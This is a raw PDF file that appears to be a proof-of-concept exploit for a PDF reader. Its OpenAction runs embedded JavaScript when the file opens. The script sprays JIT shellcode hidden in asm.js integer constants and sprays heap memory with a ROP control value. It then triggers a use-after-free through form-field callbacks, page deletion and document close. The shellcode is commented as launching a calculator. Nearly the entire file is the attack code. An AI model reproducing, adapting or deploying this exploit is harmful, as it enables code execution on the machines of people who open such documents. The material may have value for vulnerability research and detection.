%PDF-1.7

1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm 4 0 R
/OpenAction 8 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Count 3
/Kids [3 0 R 10 0 R 11 0 R]
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/Annots [5 0 R 6 0 R 7 0 R]
>>
endobj

4 0 obj
<<
/Fields [5 0 R 6 0 R 7 0 R]
/XFA [
    (xdp:xdp) 12 0 R
    (form) 13 0 R
    (</xdp:xdp>) 14 0 R
]
>>
endobj

5 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_10)
/FT /Ch
/Rect [844 625 413 191]
/Opt [(Val01)]
/I [0 1]
/Ff 67379206
>>

endobj

6 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_12)
/FT /Ch
/Rect [553 60 781 220]
/TI 990
/I [0 1]
/Ff 1743797713
>>

endobj

7 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (field_15)
/FT /Tx
/Rect [695 237 690 797]
/MaxLen 1002
/V (foobar)
/Ff 45059
>>

endobj

8 0 obj
<<
/Type /Action
/S /JavaScript
/JS 9 0 R
>>
endobj

9 0 obj
<< /Length 12155 >>
stream
// store sprayed object
var sprayArr = [];
// store sparyed asm.js modules
var asmJsModulesArr = [];

// spray CalExec + ExitProcess shellcode
// VirtualAlloc of size 0x5000 
function sprayJITShellcode(asmJsModuleName, payloadFuncName, ffiFuncName)
{
    var script = `
        function ${asmJsModuleName} (stdlib, ffi, heap){
            'use asm';
            var ffi_func = ffi.func;

            function ${payloadFuncName} () { 
                var val = 0;
                val = ffi_func(
0xc3c03368|0,
0xd6ff5168|0,
0x20758b68|0,
0x54488b68|0,
0x70458d68|0,
0xd6ff5168|0,
0x1c758b68|0,
0x244d8b68|0,
0xd6ff5168|0,
0x18758b68|0,
0x584d8b68|0,
0x90016a68|0,
0x90575068|0,
0x04c48368|0,
0x24458968|0,
0xd6ff5168|0,
0x14758b68|0,
0x54488b68|0,
0x70458d68|0,
0x90905168|0,
0xcc8b5168|0,
0x9062b568|0,
0x9077b168|0,
0x90c93368|0,
0x90f88b68|0,
0xbc749d68|0,
0x9cc13b68|0,
0x49c93368|0,
0xd6ff5168|0,
0x54758b68|0,
0x5c4d8b68|0,
0x90905168|0,
0x584d8b68|0,
0x90905168|0,
0x902ab568|0,
0x9028b168|0,
0x90000f68|0,
0xb9909068|0,
0x90006a68|0,
0x90c03368|0,
0x64c48368|0,
0x64c48368|0,
0x64c48368|0,
0x64c48368|0,
0x64c48368|0,
0x74c48368|0,
0x90d6ff68|0,
0x40758b68|0,
0xd6ff5168|0,
0x50758b68|0,
0x5c4d8b68|0,
0x3e7d9d68|0,
0x9cc13b68|0,
0x90c93368|0,
0xd6ff5168|0,
0x4c758b68|0,
0x5c4d8b68|0,
0x57106a68|0,
0x90018966|0,
0xa8024f8d|0,
0xa890d6ff|0,
0xa8512fb5|0,
0xa8902fb1|0,
0xa890c933|0,
0xa848758b|0,
0xa80f8941|0,
0xa841c933|0,
0xa8044789|0,
0xa8d6ff51|0,
0xa850488b|0,
0xa870458d|0,
0xa844758b|0,
0xa890fc8b|0,
0xa810ec83|0,
0xa85c4589|0,
0xa890c933|0,
0xa890d6ff|0,
0xa840758b|0,
0xa80e759d|0,
0xa89cc13b|0,
0xa849c933|0,
0xa8d6ff51|0,
0xa83c758b|0,
0xa8415141|0,
0xa851c933|0,
0xa890c933|0,
0xa864c483|0,
0xa864c483|0,
0xa864c483|0,
0xa864c483|0,
0xa864c483|0,
0xa864c483|0,
0xa825749d|0,
0xa89c003c|0,
0xa8d6ff52|0,
0xa838758b|0,
0xa89002b6|0,
0xa89002b2|0,
0xa890d233|0,
0xa851cc8b|0,
0xa864ec83|0,
0xa864ec83|0,
0xa864ec83|0,
0xa864ec83|0,
0xa864ec83|0,
0xa864ec83|0,
0xa8546189|0,
0xa8704d8d|0,
0xa85178b5|0,
0xa89065b1|0,
0xa8902e70|0,
0xa8b99090|0,
0xa85178b5|0,
0xa89065b1|0,
0xa8900065|0,
0xa8b99090|0,
0xa8506189|0,
0xa8704d8d|0,
0xa85139b5|0,
0xa89031b1|0,
0xa8902e32|0,
0xa8b99090|0,
0xa85136b5|0,
0xa89031b1|0,
0xa8902e38|0,
0xa8b99090|0,
0xa8512eb5|0,
0xa89031b1|0,
0xa8903631|0,
0xa8b99090|0,
0xa85100b5|0,
0xa89037b1|0,
0xa8900000|0,
0xa8b99090|0,
0xa8584589|0,
0xa8d6ff52|0,
0xa828758b|0,
0xa8902ab6|0,
0xa89028b2|0,
0xa890000f|0,
0xa8ba9090|0,
0xa890d6ff|0,
0xa830758b|0,
0xa850006a|0,
0xa890d6ff|0,
0xa80c758b|0,
0xa8544589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa84c488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8504589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa848488d|0,
0xa870458d|0,
0xa800758b|0,
0xa84c4589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa844488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8484589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa840488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8444589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa83c488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8404589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa838488d|0,
0xa870458d|0,
0xa800758b|0,
0xa83c4589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa834488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8384589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8345d8b|0,
0xa890098b|0,
0xa830488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8344589|0,
0xa8d6ff51|0,
0xa890098b|0,
0xa82c488d|0,
0xa870458d|0,
0xa808758b|0,
0xa8304589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa82c5d8b|0,
0xa890098b|0,
0xa828488d|0,
0xa870458d|0,
0xa800758b|0,
0xa82c4589|0,
0xa8d6ff51|0,
0xa890098b|0,
0xa824488d|0,
0xa870458d|0,
0xa808758b|0,
0xa8284589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8105d8b|0,
0xa890098b|0,
0xa820488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8204589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8105d8b|0,
0xa890098b|0,
0xa818488d|0,
0xa870458d|0,
0xa800758b|0,
0xa81c4589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8105d8b|0,
0xa890098b|0,
0xa814488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8184589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8105d8b|0,
0xa890098b|0,
0xa810488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8144589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8105d8b|0,
0xa890098b|0,
0xa80c488d|0,
0xa870458d|0,
0xa800758b|0,
0xa8104589|0,
0xa8d6ff51|0,
0xa890098b|0,
0xa808488d|0,
0xa870458d|0,
0xa808758b|0,
0xa80c4589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8045d8b|0,
0xa8744d8b|0,
0xa800758b|0,
0xa8084589|0,
0xa890d6ff|0,
0xa8905351|0,
0xa8045d8b|0,
0xa8704d8b|0,
0xa800758b|0,
0xa84c4889|0,
0xa870458d|0,
0xa844488d|0,
0xa870438d|0,
0xa8484889|0,
0xa870458d|0,
0xa838488d|0,
0xa870438d|0,
0xa8444889|0,
0xa870458d|0,
0xa830488d|0,
0xa870438d|0,
0xa8404889|0,
0xa870458d|0,
0xa82a488d|0,
0xa870438d|0,
0xa83c4889|0,
0xa870458d|0,
0xa820488d|0,
0xa870438d|0,
0xa8384889|0,
0xa870458d|0,
0xa815488d|0,
0xa870438d|0,
0xa8344889|0,
0xa870458d|0,
0xa80e488d|0,
0xa870438d|0,
0xa8304889|0,
0xa870458d|0,
0xa803488d|0,
0xa870438d|0,
0xa82c4889|0,
0xa870458d|0,
0xa8684b8d|0,
0xa8284889|0,
0xa870458d|0,
0xa85d4b8d|0,
0xa8244889|0,
0xa870458d|0,
0xa8524b8d|0,
0xa8204889|0,
0xa870458d|0,
0xa84b4b8d|0,
0xa81c4889|0,
0xa870458d|0,
0xa8464b8d|0,
0xa8184889|0,
0xa870458d|0,
0xa83f4b8d|0,
0xa8144889|0,
0xa870458d|0,
0xa8384b8d|0,
0xa8104889|0,
0xa870458d|0,
0xa8314b8d|0,
0xa80c4889|0,
0xa870458d|0,
0xa82b4b8d|0,
0xa8084889|0,
0xa870458d|0,
0xa81e4b8d|0,
0xa8044889|0,
0xa870458d|0,
0xa80d4b8d|0,
0xa8900889|0,
0xa870458d|0,
0xa8900b8d|0,
0xa8405388|0,
0xa80a5388|0,
0xa89079b2|0,
0xa8665388|0,
0xa8605388|0,
0xa8325388|0,
0xa81c5388|0,
0xa89077b2|0,
0xa8475088|0,
0xa870438d|0,
0xa89076b2|0,
0xa81d5088|0,
0xa870438d|0,
0xa80b5088|0,
0xa870438d|0,
0xa8525388|0,
0xa81e5388|0,
0xa89075b2|0,
0xa8425088|0,
0xa870438d|0,
0xa8365088|0,
0xa870438d|0,
0xa82b5088|0,
0xa870438d|0,
0xa8235088|0,
0xa870438d|0,
0xa8135088|0,
0xa870438d|0,
0xa80a5088|0,
0xa870438d|0,
0xa8075088|0,
0xa870438d|0,
0xa8485388|0,
0xa8425388|0,
0xa8355388|0,
0xa8215388|0,
0xa80f5388|0,
0xa89074b2|0,
0xa83d5088|0,
0xa870438d|0,
0xa83b5088|0,
0xa870438d|0,
0xa82e5088|0,
0xa870438d|0,
0xa80e5088|0,
0xa870438d|0,
0xa8535388|0,
0xa8415388|0,
0xa83f5388|0,
0xa83c5388|0,
0xa8245388|0,
0xa8135388|0,
0xa89073b2|0,
0xa8445088|0,
0xa870438d|0,
0xa8285088|0,
0xa870438d|0,
0xa8095088|0,
0xa870438d|0,
0xa8555388|0,
0xa8495388|0,
0xa8335388|0,
0xa8205388|0,
0xa8095388|0,
0xa8075388|0,
0xa89072b2|0,
0xa81e5088|0,
0xa870438d|0,
0xa80c5088|0,
0xa870438d|0,
0xa8475388|0,
0xa82d5388|0,
0xa89070b2|0,
0xa83e5088|0,
0xa870438d|0,
0xa83a5088|0,
0xa870438d|0,
0xa8315088|0,
0xa870438d|0,
0xa82c5088|0,
0xa870438d|0,
0xa80f5088|0,
0xa870438d|0,
0xa8655388|0,
0xa85f5388|0,
0xa84f5388|0,
0xa83b5388|0,
0xa82c5388|0,
0xa81b5388|0,
0xa8145388|0,
0xa8115388|0,
0xa8015388|0,
0xa8906fb2|0,
0xa8335088|0,
0xa870438d|0,
0xa8325088|0,
0xa870438d|0,
0xa82d5088|0,
0xa870438d|0,
0xa8215088|0,
0xa870438d|0,
0xa81c5088|0,
0xa870438d|0,
0xa8635388|0,
0xa82f5388|0,
0xa8195388|0,
0xa8125388|0,
0xa8906eb2|0,
0xa84b5388|0,
0xa8445388|0,
0xa8906db2|0,
0xa8395088|0,
0xa870438d|0,
0xa8195088|0,
0xa870438d|0,
0xa8015088|0,
0xa870438d|0,
0xa8705388|0,
0xa85b5388|0,
0xa85a5388|0,
0xa84e5388|0,
0xa84d5388|0,
0xa83a5388|0,
0xa8295388|0,
0xa8285388|0,
0xa8155388|0,
0xa8906cb2|0,
0xa8405088|0,
0xa870438d|0,
0xa8115088|0,
0xa870438d|0,
0xa8906bb2|0,
0xa8205088|0,
0xa870438d|0,
0xa8625388|0,
0xa8345388|0,
0xa8185388|0,
0xa8055388|0,
0xa89069b2|0,
0xa82a5088|0,
0xa870438d|0,
0xa85e5388|0,
0xa89068b2|0,
0xa8465388|0,
0xa8385388|0,
0xa8315388|0,
0xa82b5388|0,
0xa89066b2|0,
0xa8455088|0,
0xa870438d|0,
0xa8415088|0,
0xa870438d|0,
0xa83c5088|0,
0xa870438d|0,
0xa8345088|0,
0xa870438d|0,
0xa8225088|0,
0xa870438d|0,
0xa81a5088|0,
0xa870438d|0,
0xa8125088|0,
0xa870438d|0,
0xa8545388|0,
0xa8435388|0,
0xa83d5388|0,
0xa8365388|0,
0xa82e5388|0,
0xa8255388|0,
0xa8165388|0,
0xa80e5388|0,
0xa89065b2|0,
0xa8275088|0,
0xa870438d|0,
0xa8265088|0,
0xa870438d|0,
0xa86f5388|0,
0xa8645388|0,
0xa8595388|0,
0xa8275388|0,
0xa81a5388|0,
0xa8035388|0,
0xa89064b2|0,
0xa8465088|0,
0xa870438d|0,
0xa83f5088|0,
0xa870438d|0,
0xa8385088|0,
0xa870438d|0,
0xa8355088|0,
0xa870438d|0,
0xa8305088|0,
0xa870438d|0,
0xa8105088|0,
0xa870438d|0,
0xa8505388|0,
0xa8395388|0,
0xa81f5388|0,
0xa89063b2|0,
0xa8225388|0,
0xa8065388|0,
0xa89062b2|0,
0xa8255088|0,
0xa870438d|0,
0xa81b5088|0,
0xa870438d|0,
0xa8085088|0,
0xa870438d|0,
0xa84c5388|0,
0xa8235388|0,
0xa8085388|0,
0xa8025388|0,
0xa89061b2|0,
0xa8245088|0,
0xa870438d|0,
0xa86b5388|0,
0xa8905fb2|0,
0xa8155088|0,
0xa870438d|0,
0xa8035088|0,
0xa870438d|0,
0xa8685388|0,
0xa8615388|0,
0xa8175388|0,
0xa89057b2|0,
0xa8165088|0,
0xa870438d|0,
0xa8065088|0,
0xa870438d|0,
0xa8045088|0,
0xa870438d|0,
0xa8695388|0,
0xa85d5388|0,
0xa89053b2|0,
0xa8045388|0,
0xa8901388|0,
0xa8904cb2|0,
0xa80d5388|0,
0xa89047b2|0,
0xa8185088|0,
0xa870438d|0,
0xa8105388|0,
0xa89043b2|0,
0xa8175088|0,
0xa870438d|0,
0xa8055088|0,
0xa870438d|0,
0xa80b5388|0,
0xa89041b2|0,
0xa86c5388|0,
0xa8565388|0,
0xa89033b2|0,
0xa86d5388|0,
0xa86a5388|0,
0xa8575388|0,
0xa89032b2|0,
0xa86e5388|0,
0xa8585388|0,
0xa8265388|0,
0xa8902eb2|0,
0xa8485088|0,
0xa870438d|0,
0xa8435088|0,
0xa870438d|0,
0xa8375088|0,
0xa870438d|0,
0xa82f5088|0,
0xa870438d|0,
0xa8295088|0,
0xa870438d|0,
0xa81f5088|0,
0xa870438d|0,
0xa8145088|0,
0xa870438d|0,
0xa80d5088|0,
0xa870438d|0,
0xa8025088|0,
0xa870438d|0,
0xa8675388|0,
0xa85c5388|0,
0xa8515388|0,
0xa84a5388|0,
0xa8455388|0,
0xa83e5388|0,
0xa8375388|0,
0xa8305388|0,
0xa82a5388|0,
0xa81d5388|0,
0xa80c5388|0,
0xa89000b2|0,
0xa890c033|0,
0xa890dc8b|0,
0xa878ec83|0,
0xa878ec83|0,
0xa8047d89|0,
0xa8007589|0,
0xa890ec8b|0,
0xa878ec83|0,
0xa878ec83|0,
0xa8905f53|0,
0xa8ff335e|0,
0xa852f633|0,
0xa890d303|0,
0xa88e148b|0,
0xa890f303|0,
0xa81c728b|0,
0xa8909049|0,
0xa80e8b66|0,
0xa890f103|0,
0xa890e1d1|0,
0xa890f303|0,
0xa824728b|0,
0xa8598deb|0,
0xa85905eb|0,
0xa804759d|0,
0xa89c0839|0,
0xa89064b5|0,
0xa89064b1|0,
0xa8906572|0,
0xa8b99090|0,
0xa804c083|0,
0xa827759d|0,
0xa89c0839|0,
0xa8906fb5|0,
0xa89072b1|0,
0xa8904163|0,
0xa8b99090|0,
0xa804c083|0,
0xa84a759d|0,
0xa89c0839|0,
0xa89065b5|0,
0xa89047b1|0,
0xa8905074|0,
0xa8b9c303|0,
0xa89051ad|0,
0xa841c933|0,
0xa890f303|0,
0xa820728b|0,
0xa890d303|0,
0xa878528b|0,
0xa890d303|0,
0xa83c538b|0,
0xa810588b|0,
0xa8ad96ad|0,
0xa814708b|0,
0xa80c408b|0,
0xa8008b64|0,
0xa858306a|0,
0xa890c933|0,
0xa8909090|0,
0x17cbbca2|0,
//using predicated 17cb0000 base
                )|0;
                return val|0;
            }
            return ${payloadFuncName};
        }

        function ${ffiFuncName} () {
            var x = 0;
            return x|0;
        } 
        for (var f=0; f<0x10; f++) { 
            asmJsModulesArr.push(${asmJsModuleName}(this, { func: ${ffiFuncName} }, 0)); 
        };
    `;
    eval(script)
    // required to generate jit code
    asmJsModulesArr[asmJsModulesArr.length-1]();
}

// spray memory allocations
function reclaim(size, count){
    for (var i = 0; i < count; i++) {
        sprayArr[i] = new SharedArrayBuffer(size);
        var rop = new DataView(sprayArr[i]);
        //control value for - call dword ptr [eax+74h]
        //first dword is pointer to the shellcode
        rop.setUint32(0, 0x29bccb17);
        for (var j = 4; j < rop.byteLength/4; j+=4) {
            rop.setUint32(j, 0x42424242);
        }
    }
}

//spray jit shellcode allocation
//0000BCA2: index to shellcode from the base of the virtualalloc
for (var jitcount=0; jitcount<0500; jitcount++) {
    sprayJITShellcode("foo"+jitcount, "payload"+jitcount, "ffi_func"+jitcount);
}

// code to trigger vulnerabilty
var f0 = this.getField("field_15");
var f1 = this.getField("field_12");

f1.setAction("Format", "formatCallback()"); 
this.getField("field_10").setFocus();

function calculateCallback()
{
    //trigger formatCallback on field 1
    f1.setItems([1]);

    // reclaim freed memory by spraying fixed allocations
    reclaim(0x58, 0x1000);
    reclaim(0x68, 0x1000);
}

function formatCallback()
{
    // free object of size 0x68
    this.deletePages(0);
}

f0.setAction("Calculate", "calculateCallback()");

//close document to trigger vulnerability
this.closeDoc(true);
endstream
endobj

10 0 obj
<< /Parent 2 0 R
/Resources <<
/Font <<
    /F1 <<
        /Type /Font
        /Subtype /Type1
        /BaseFont /Helvetica
        /Name /F1
    >>
>>
>>
/Type /Page
/MediaBox [ 0 0 795 842 ]
>>
endobj

11 0 obj
<< /Parent 2 0 R
/Resources <<
/Font <<
    /F1 <<
        /Type /Font
        /Subtype /Type1
        /BaseFont /Helvetica
        /Name /F1
    >>
>>
>>
/Type /Page
/MediaBox [ 0 0 795 842 ]
>>
endobj

12 0 obj
<< /Length 89 >>
stream
<?xml version="1.0" encoding="UTF-8"?>
    <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
endstream
endobj

13 0 obj
<< /Length 364 >>
stream

    <template id="template0"> 
    <subform id="subform0" name="subform0">
        <pageSet>
            <pageArea id="Page-HC0" name="Page-HC0">
                <contentArea h="10.5in" w="8in" x="0.25in" y="0.25in"/>
                <medium long="11in" short="8.5in" stock="letter"/>
            </pageArea>
        </pageSet>
    </subform>
    </template>
    
endstream
endobj

14 0 obj
<< /Length 10 >>
stream
</xdp:xdp>
endstream
endobj

xref
0 15
0000000000 65535 f 
0000000010 00000 n 
0000000094 00000 n 
0000000166 00000 n 
0000000242 00000 n 
0000000364 00000 n 
0000000500 00000 n 
0000000630 00000 n 
0000000764 00000 n 
0000000825 00000 n 
0000013034 00000 n 
0000013247 00000 n 
0000013460 00000 n 
0000013601 00000 n 
0000014018 00000 n 
trailer
<<
 /Size 15
 /Root 1 0 R
>>
startxref
14080
%%EOF
